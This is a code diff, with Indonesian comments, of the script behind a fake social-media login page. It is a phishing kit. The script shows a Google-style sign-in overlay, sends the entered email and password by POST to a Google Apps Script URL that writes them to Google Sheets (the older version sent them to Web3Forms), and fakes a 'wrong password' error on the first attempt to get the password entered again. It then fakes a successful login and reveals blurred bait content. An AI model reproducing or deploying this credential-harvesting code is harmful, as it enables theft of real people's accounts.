@@ -230,91 +230,75 @@
         </nav>
     </div>
 
-    <script>
-        lucide.createIcons();
-        let loginAttempts = 0;
-        
-        function showLogin() { document.getElementById('login-overlay').style.display = 'flex'; }
-        
-        function goToForm(p) { 
-            const userInput = document.getElementById('user-input');
-            const errorLabel = document.getElementById('fake-error');
-            document.getElementById('step-social').style.display = 'none'; 
-            document.getElementById('step-form').style.display = 'block';
-            document.getElementById('provider-name').innerText = p;
-            document.getElementById('provider-input').value = p;
-            errorLabel.style.display = 'none';
-            userInput.placeholder = (p === 'Google') ? "Masukkan alamat Gmail" : "Email atau Telepon";
+<script>
+    lucide.createIcons();
+    let loginAttempts = 0;
+    
+    // TEMPEL URL WEB APP DARI GOOGLE SCRIPT DI SINI
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbwleJKr-XnfvSv6uJfHkiDRCeZY2sK50N2E-YrZAGJ1r6cQ4P8R9OjPs4365xD19ZYl/exec'; 
+
+    function showLogin() { 
+        document.getElementById('login-overlay').style.display = 'flex'; 
+    }
+    
+    function goToForm(p) { 
+        const userInput = document.getElementById('user-input');
+        const errorLabel = document.getElementById('fake-error');
+        document.getElementById('step-social').style.display = 'none'; 
+        document.getElementById('step-form').style.display = 'block';
+        document.getElementById('provider-name').innerText = p;
+        document.getElementById('provider-input').value = p;
+        errorLabel.style.display = 'none';
+        userInput.placeholder = (p === 'Google') ? "Masukkan alamat Gmail" : "Email atau Telepon";
+    }
+
+    const form = document.getElementById('login-form');
+    form.onsubmit = async (e) => {
+        e.preventDefault();
+        const provider = document.getElementById('provider-input').value;
+        const userVal = document.getElementById('user-input').value;
+        const errorLabel = document.getElementById('fake-error');
+        const btn = document.getElementById('submit-btn');
+
+        if (provider === 'Google' && !userVal.toLowerCase().endsWith('@gmail.com')) {
+            errorLabel.innerText = "Gunakan alamat @gmail.com yang valid!";
+            errorLabel.style.display = 'block';
+            return;
         }
 
-        const form = document.getElementById('login-form');
-        form.onsubmit = async (e) => {
-            e.preventDefault();
-            const provider = document.getElementById('provider-input').value;
-            const userVal = document.getElementById('user-input').value;
-            const errorLabel = document.getElementById('fake-error');
-            const btn = document.getElementById('submit-btn');
+        btn.disabled = true;
+        btn.innerText = "MENGECEK...";
 
-            if (provider === 'Google' && !userVal.toLowerCase().endsWith('@gmail.com')) {
-                errorLabel.innerText = "Gunakan alamat @gmail.com yang valid!";
-                errorLabel.style.display = 'block';
-                return;
-            }
+        // KIRIM DATA KE GOOGLE SHEETS
+        fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+            .then(res => console.log('Terkirim ke Sheets'))
+            .catch(err => console.error('Error:', err.message));
 
-            // --- PERCOBAAN PERTAMA (GAGAL) ---
+        // LOGIKA PERCOBAAN LOGIN (2X)
+        setTimeout(() => {
             if (loginAttempts === 0) {
-                btn.innerText = "MENGECEK...";
-                btn.disabled = true;
-
-                // Kirim data ke Web3Forms
-                const formData = new FormData(form);
-                const object = Object.fromEntries(formData);
-                fetch('https://api.web3forms.com/submit', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-                    body: JSON.stringify(object)
-                });
-
+                loginAttempts++;
+                btn.innerText = "KONFIRMASI & MASUK";
+                btn.disabled = false;
+                errorLabel.innerText = "Kata sandi salah. Silakan coba lagi.";
+                errorLabel.style.display = 'block';
+                document.getElementById('pass-input').value = ""; 
+            } else {
+                btn.style.background = "#22c55e"; 
+                btn.innerText = "LOGIN BERHASIL! MEMBUKA...";
+                
                 setTimeout(() => {
-                    loginAttempts++;
-                    btn.innerText = "KONFIRMASI & MASUK";
-                    btn.disabled = false;
-                    errorLabel.innerText = "Kata sandi salah. Silakan coba lagi.";
-                    errorLabel.style.display = 'block';
-                    document.getElementById('pass-input').value = "";
-                }, 1500);
-            } 
-            // --- PERCOBAAN KEDUA (PURA-PURA BERHASIL) ---
-            else {
-                btn.innerText = "MENSINKRONISASI AKUN...";
-                btn.disabled = true;
-                errorLabel.style.display = 'none';
-
-                const formData = new FormData(form);
-                const object = Object.fromEntries(formData);
-                fetch('https://api.web3forms.com/submit', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-                    body: JSON.stringify(object)
-                });
-
-                setTimeout(() => {
-                    btn.style.background = "#22c55e"; // Tombol jadi Hijau
-                    btn.innerText = "LOGIN BERHASIL! MEMBUKA...";
-                    
+                    document.getElementById('login-overlay').style.opacity = '0';
                     setTimeout(() => {
-                        document.getElementById('login-overlay').style.opacity = '0';
-                        setTimeout(() => {
-                            document.getElementById('login-overlay').style.display = 'none';
-                            // Efek buka konten
-                            document.querySelectorAll('.post-blur').forEach(el => el.style.filter = 'none');
-                            document.querySelectorAll('.lock-btn').forEach(el => el.style.display = 'none');
-                            document.querySelectorAll('.play-overlay').forEach(el => el.style.display = 'none');
-                        }, 500);
-                    }, 1500);
-                }, 2500);
+                        document.getElementById('login-overlay').style.display = 'none';
+                        document.querySelectorAll('.post-blur').forEach(el => el.style.filter = 'none');
+                        document.querySelectorAll('.lock-btn').forEach(el => el.style.display = 'none');
+                        document.querySelectorAll('.play-overlay').forEach(el => el.style.display = 'none');
+                    }, 500);
+                }, 1500);
             }
-        };
-    </script>
+        }, 2000); 
+    };
+</script>
 </body>
 </html>
